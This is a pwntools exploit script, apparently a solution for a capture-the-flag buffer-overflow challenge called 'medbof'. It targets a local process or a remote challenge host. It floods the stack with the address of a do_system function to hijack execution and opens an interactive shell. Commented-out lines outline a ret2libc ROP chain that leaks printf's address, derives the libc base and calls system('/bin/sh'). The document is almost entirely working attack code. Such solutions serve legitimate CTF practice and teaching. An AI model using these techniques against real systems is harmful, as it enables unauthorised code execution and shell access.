from pwn import *

exe = ELF('./medbof')
context.binary = exe.path

io = process(exe.path)
if args.GDB:
    io = gdb.debug(exe.path, """
        b *main
        b *do_input+57
        continue
    """)
elif args.REMOTE:
    io = remote("0.cloud.chals.io", '27380')

do_system = 0x0000000000400646
io.sendline(pack(do_system) * 30)
io.interactive()
# rop = ROP(exe)
# offset = 40

# rop.raw(b'a' * offset)
# rop.raw(rop.ret)
# rop.printf(exe.got["printf"])
# rop.raw(rop.ret)
# rop.main()
# io.sendlineafter(b': ', rop.chain())

# printf_libc = unpack(io.recv(6).ljust(8, b'\x00'))
# libc.address = printf_libc - libc.symbols["printf"]

# rop = ROP(exe)
# system = libc.symbols["system"]
# bin_sh = next(libc.search(b"/bin/sh"))
# rop.raw(b'a' * offset)
# rop.raw(rop.ret)
# rop.call(system, [bin_sh])

# io.sendlineafter(b': ', rop.chain())
# io.interactive()